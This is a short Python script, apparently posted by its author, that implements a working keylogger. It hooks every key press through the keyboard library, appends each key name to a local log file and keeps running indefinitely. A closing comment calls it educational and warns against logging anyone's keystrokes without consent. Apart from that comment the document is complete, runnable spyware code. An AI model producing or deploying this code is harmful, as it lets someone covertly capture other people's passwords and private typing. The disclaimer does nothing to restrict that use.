import keyboard
import os

# Specify the full path where you want to save the log file
log_file = '/full/path/to/typed_keys.txt'

# Ensuring the directory exists, check before or create it if necessary
os.makedirs(os.path.dirname(log_file), exist_ok=True)

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

keyboard.on_press(on_key_press)

keyboard.wait()


# Disclaimer:
# This keylogger is for educational purposes only. 
# Unauthorized use of this software to monitor or log keystrokes of another individual without their explicit permission is illegal and unethical. 
# Always obtain consent before using this tool.
# This is for learning and demonstartion purpose - salmanfareeth.